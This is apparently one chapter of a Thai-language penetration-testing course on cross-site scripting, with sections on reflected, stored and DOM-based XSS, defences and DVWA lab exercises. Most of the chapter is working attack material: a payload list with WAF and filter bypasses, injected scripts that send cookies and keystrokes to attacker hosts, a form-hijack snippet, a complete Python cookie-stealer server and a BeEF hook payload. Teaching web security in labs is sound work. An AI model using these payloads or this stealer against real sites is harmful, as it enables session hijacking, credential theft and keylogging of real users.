# Part 27: Cross-Site Scripting (XSS)

## สารบัญ
- [27.1 XSS คืออะไร](#271-xss-คืออะไร)
- [27.2 Reflected XSS](#272-reflected-xss)
- [27.3 Stored XSS](#273-stored-xss)
- [27.4 DOM-based XSS](#274-dom-based-xss)
- [27.5 XSS Payloads](#275-xss-payloads)
- [27.6 Cookie Stealing ด้วย XSS](#276-cookie-stealing-ด้วย-xss)
- [27.7 BeEF Framework](#277-beef-framework)
- [27.8 XSS ใน Context ต่างๆ](#278-xss-ใน-context-ต่างๆ)
- [27.9 การป้องกัน XSS](#279-การป้องกัน-xss)
- [27.10 แบบฝึกหัด Lab](#2710-แบบฝึกหัด-lab)

---

## 27.1 XSS คืออะไร

XSS (Cross-Site Scripting) คือการแทรกใส่ JavaScript Code เข้าไปใน Web Page เพื่อให้ Browser ของเหยื่อรัน Code นั้น

### ผลกระทบ
```
- Cookie Stealing    - ขโมย Session Cookie
- Credential Theft  - Fake Login Form
- Keylogging        - ดักการพิมพ์
- Phishing          - Redirect ไป Fake Page
- Defacement        - เปลี่ยนหน้า Web
- Browser Hijacking - Control เบราว์เซอร์ผู้ใช้
```

---

## 27.2 Reflected XSS

```
Reflected XSS:
  - Input ถูก reflect กลับใน Response ทันที
  - เหยื่อต้องคลิก URL ที่แตกต่าง
  - Non-persistent
```

### ตัวอย่าง
```
URL: http://target.com/search?q=kali
Response: <p>Results for: kali</p>

Attack URL: http://target.com/search?q=<script>alert(1)</script>
Response: <p>Results for: <script>alert(1)</script></p>
ผล: Browser รัน Script! Alert ปรากฏ
```

```bash
# Test Reflected XSS
curl 'http://target.com/search?q=<script>alert(1)</script>'
# ดูว่า <script> อยู่ใน Response หรือเปล่า?

# URL Encoded
curl 'http://target.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
```

---

## 27.3 Stored XSS

```
Stored XSS (Persistent XSS):
  - Script ถูกเก็บใน Database
  - ทุกคนที่เปิดหน้าจะโดน
  - Persistent อันตรายกว่า Reflected
```

### ตัวอย่าง
```
Comment Box:

Name: Attacker
Comment: <script>document.location='http://evil.com/steal?c='+document.cookie</script>

เพราะถูกเก็บใน DB ทุกคนที่เปิดหน้านี้จะถูกโดน Cookie Steal!
```

```bash
# Test Stored XSS
curl -X POST http://target.com/comments \
  -d 'name=Test&comment=<script>alert("XSS")</script>'

# เปิดดูหน้าที่ Comments
curl http://target.com/comments | grep '<script>'
```

---

## 27.4 DOM-based XSS

```
DOM XSS:
  - JavaScript กระทำกับ DOM โดยตรง
  - ไม่ผ่าน Server
  - หาได้ยากขึ้น เพราะไม่อยู่ใน Response
```

```javascript
// Vulnerable Code
document.getElementById('name').innerHTML = location.hash.slice(1);

// Payload URL:
http://target.com/page#<img src=x onerror=alert(1)>
```

---

## 27.5 XSS Payloads

```html
<!-- Basic Payloads -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Event Handler Payloads -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>

<!-- WAF Bypass Payloads -->
<ScRiPt>alert(1)</ScRiPt>          <!-- Case variation -->
<script >alert(1)</script>         <!-- Space in tag -->
<scr<script>ipt>alert(1)</scr</script>ipt>  <!-- Nested -->
<img src='x' onerror='alert(1)'>  <!-- Single quotes -->
<svg/onload=alert(1)>              <!-- No space -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">  <!-- HTML entities -->

<!-- Filter Bypass -->
jaVaScript:alert(1)                <!-- Capital JS -->
javascript:alert(String.fromCharCode(88,83,83))  <!-- Charcode -->
<img src="javascript:alert(1)">    <!-- In src -->

<!-- Polyglot Payload (works in multiple contexts) -->
'"</script><script>alert(1)</script>
```

### แสดงผลประสิทธิภาพของ XSS
```javascript
// ดึงข้อมูล Cookie และส่งไป Attacker Server
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + btoa(document.cookie);
</script>

// Keylogger
<script>
  document.addEventListener('keypress', function(e) {
    var img = new Image();
    img.src = 'http://attacker.com/key?k=' + e.key;
  });
</script>

// Form Hijack
<script>
  document.forms[0].action = 'http://attacker.com/capture';
</script>
```

---

## 27.6 Cookie Stealing ด้วย XSS

### Setup Cookie Stealer Server
```python
#!/usr/bin/env python3
# cookie_stealer.py - รับและเก็บ Cookie

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64
import datetime

class CookieStealer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if 'cookie' in params:
            cookie = params['cookie'][0]
            try:
                decoded = base64.b64decode(cookie).decode()
            except:
                decoded = cookie
            
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ip = self.client_address[0]
            
            log = f"[{timestamp}] Cookie from {ip}: {decoded}"
            print(log)
            
            with open('/tmp/stolen_cookies.txt', 'a') as f:
                f.write(log + '\n')
        
        elif 'key' in params:
            key = params['key'][0]
            print(f"[Keylog] {key}", end='', flush=True)
        
        # Return invisible pixel
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
    
    def log_message(self, format, *args):
        pass  # Suppress default log

if __name__ == '__main__':
    PORT = 8888
    server = HTTPServer(('0.0.0.0', PORT), CookieStealer)
    print(f'[*] Cookie Stealer listening on port {PORT}')
    print(f'[*] XSS Payload: <script>new Image().src="http://YOUR_IP:{PORT}/steal?cookie="+btoa(document.cookie)</script>')
    print(f'[*] Stolen cookies saved to: /tmp/stolen_cookies.txt')
    server.serve_forever()
```

### XSS Payload สำหรับ Cookie Steal
```html
<!-- เปลี่ยน YOUR_IP เป็น IP ของเรา -->
<script>new Image().src="http://YOUR_IP:8888/steal?cookie="+btoa(document.cookie)</script>

<!-- Short version -->
<img src=x onerror="fetch('http://YOUR_IP:8888/?c='+document.cookie)">

<!-- Stored in comment field -->
<b onmouseover="new Image().src='http://YOUR_IP:8888/steal?c='+document.cookie">Hover me!</b>
```

---

## 27.7 BeEF Framework

```bash
# ติดตั้ง
sudo apt install beef-xss -y

# เริ่ม
cd /usr/share/beef-xss
sudo beef-xss

# เปิด Web UI:
https://localhost:3000/ui/panel
# Login: beef/beef
```

### BeEF Hook Payload
```html
<!-- เพิ่ม Hook ให้ Victim's Browser -->
<script src="http://YOUR_IP:3000/hook.js"></script>

<!-- ใน Stored XSS -->
<script src="http://192.168.1.50:3000/hook.js"></script>
```

---

## 27.8 XSS ใน Context ต่างๆ

### HTML Context
```html
<!-- Normal HTML: ใส่ <script> ตรงๆ -->
Hello, [INPUT] World
<!-- Payload: <script>alert(1)</script> -->
Hello, <script>alert(1)</script> World
```

### Attribute Context
```html
<!-- ใน Attribute: ต้องหลุด Quote ก่อน -->
<input value="[INPUT]">
<!-- Payload: " autofocus onfocus=alert(1) x=" -->
<input value="" autofocus onfocus=alert(1) x="">
```

### JavaScript Context
```javascript
// ใน JavaScript String
var name = '[INPUT]';
// Payload: ';alert(1);//
var name = '';alert(1);//';
```

### URL Context
```html
<!-- ใน href/src -->
<a href="[INPUT]">Click</a>
<!-- Payload: javascript:alert(1) -->
<a href="javascript:alert(1)">Click</a>
```

---

## 27.9 การป้องกัน XSS

```javascript
// Input Encoding - ปลอดภัยที่สุด
function htmlEncode(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Content Security Policy Header
Content-Security-Policy: default-src 'self'; script-src 'nonce-RANDOM_NONCE'

// HttpOnly Cookie - ป้องกัน JS อ่าน Cookie
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict

// React (Auto-escapes by default)
// Never use dangerouslySetInnerHTML without sanitizing!
```

---

## 27.10 แบบฝึกหัด Lab

### Lab 27-1: Reflected XSS (DVWA)
```bash
# 1. Setup DVWA
docker run -d -p 8080:80 vulnerables/web-dvwa

# 2. XSS (Reflected)
# URL: http://localhost:8080/vulnerabilities/xss_r/?name=test
# Payload: <script>alert(document.domain)</script>

# 3. ตรวจ Response
curl 'http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>' \
  -H 'Cookie: PHPSESSID=YOURSESSION; security=low' | grep '<script>'
```

### Lab 27-2: Cookie Steal
```bash
# 1. เริ่ม Cookie Stealer
python3 cookie_stealer.py &

# 2. Inject Payload
# ใส่ Comment: <script>new Image().src="http://localhost:8888/steal?cookie="+btoa(document.cookie)</script>

# 3. ดูผล Stolen Cookies
cat /tmp/stolen_cookies.txt
```

---

## สรุป

| ประเภท | ลักษณะ | อันตราย |
|--------|--------|-------|
| Reflected | URL Parameter | Session Hijacking |
| Stored | Database | Mass Attack |
| DOM | JavaScript | Client-side Only |

> **จำไว้:** HTML Encoding Input + CSP Header + HttpOnly Cookie = ป้องกัน XSS ได้ดี
